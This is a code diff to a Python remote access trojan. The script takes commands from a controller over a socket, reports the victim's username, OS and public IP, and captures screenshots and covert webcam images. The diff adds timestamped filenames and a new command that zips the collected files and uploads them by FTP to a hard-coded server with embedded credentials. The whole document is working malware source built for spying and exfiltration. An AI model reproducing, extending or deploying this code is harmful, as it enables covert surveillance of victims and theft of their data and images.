@@ -9,8 +9,11 @@ import pyautogui
 import shutil
 import time
 import platform
+import ssl
+import ftplib
 from swinlnk.swinlnk import SWinLnk
 from cv2 import *
+from datetime import datetime
 
 
 # First Start
@@ -41,6 +44,7 @@ while True:
         time.sleep(1800)
         continue
 
+
 try:
     while True:
         data = s.recv(1024)
@@ -51,12 +55,29 @@ try:
         elif data.decode().lower() == "show os":                # show os
             s.send(sys.platform.encode())
         
-        elif data.decode().lower() == "show global ip":                 # show global ip
+        elif data.decode().lower() == "set global ip":                 # show global ip
             try:
-                global_ip = urllib.request.urlopen("https://api.ipify.org/")
-                s.send(str(global_ip.readlines()).encode())
+                for i in 1,2,3:
+                    try:
+                        req = "https://api.ipify.org/"
+                        gcontext = ssl.SSLContext() 
+                        info_global_ip = urllib.request.urlopen(req, context=gcontext).read()
+                        break
+                    except:
+                        req = "http://api.ipify.org/"
+                        info_global_ip = urllib.request.urlopen(req).read()
+                        break
+
+                s.send(str(info_global_ip).encode())
             except:
                 s.send(b"this works not yet")
+        
+        elif data.decode().lower() == "show global ip":
+            try:
+                s.send(str(info_global_ip).encode())
+            except:
+                s.send(b"this works not yet")
+
 
         elif data.decode().lower() == "show username":          # show username
             s.send(getpass.getuser().encode())
@@ -70,7 +91,7 @@ try:
         elif data.decode().lower() == "make screenshot":        # make screenshot   # This is under development and is not yet finished!
             try:
                 screen_shot = pyautogui.screenshot()
-                screen_shot.save('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files\\'+"screenshot.png", "PNG")
+                screen_shot.save('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files\\'+str(info_global_ip)+'_screenshot_at-'+str(datetime.now().strftime('%m.%d_%H-%M-%S'))+'.png', "PNG")
                 s.send(b"screenshot was taken")
             except:
                 s.send(b"this works not yet")
@@ -81,7 +102,7 @@ try:
                 for i in range(0, 5):
                     worked, img = webcam.read()
                     if worked:
-                        imwrite('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files\\'+"cam_shot.jpg", img)
+                        imwrite('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files\\'+str(info_global_ip)+'_camshot_at-'+str(datetime.now().strftime('%m.%d_%H-%M-%S'))+'.jpg', img)
                         webcam.release()
                         s.send(b"cam shot was taken")
             except:
@@ -89,18 +110,17 @@ try:
 
         elif data.decode().lower() == "make zip":               # make zip
             try:
-                shutil.make_archive("C:\\Users\\"+getpass.getuser()+"\\payload\\payload_files\\sendme", "zip", 'C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files') 
+                shutil.make_archive("C:\\Users\\"+getpass.getuser()+"\\payload\\payload_files\\files", "zip", 'C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files') 
                 s.send(b"zipped")
 
-            except FileNotFoundError:
-                s.send(b"File not found")
+            except FileExistsError:
+                s.send(b"file exists")
             except:
                 s.send(b"this works not yet")
 
-
         elif data.decode().lower()== "remove zip":              # remove zip
             try:
-                os.remove("C:\\Users\\"+getpass.getuser()+"\\payload\\payload_files\\sendme.zip")
+                os.remove("C:\\Users\\"+getpass.getuser()+"\\payload\\payload_files\\files.zip")
                 s.send(b"removed")
 
             except FileNotFoundError:
@@ -108,7 +128,25 @@ try:
             except:
                 s.send(b"this works not yet")
 
-        
+        elif data.decode().lower()== "send ftp zip":
+            try:
+                filename= str(info_global_ip)+"_at_+"+str(datetime.now().strftime('%m.%d_%H-%M-%S'))+"_send.zip"
+                ftp= ftplib.FTP('192.168.178.111')           # IP from FTP Server!
+                ftp.login('ftpuser', 'vbox')                # username and password from the ftp server!
+                ftp.cwd('/files/')                          # Path from the ftp user pwd!
+                uploadfile= open('C:\\Users\\Windows\\payload\\payload_files\\files.zip', 'rb') 
+                ftp.storbinary('STOR ' + filename, uploadfile)
+                ftp.close()
+                uploadfile.close()
+                s.send(b"file was sent, remove it with 'remove zip'")
+            except ConnectionRefusedError:
+                s.send(b"ConnectionRefusedError")
+            except ConnectionError:
+                s.send(b"ConnectionError")
+            except FileNotFoundError:
+                s.send(b"File not found")
+            except:
+                s.send(b"this works not yet")
 
         else:
             pass
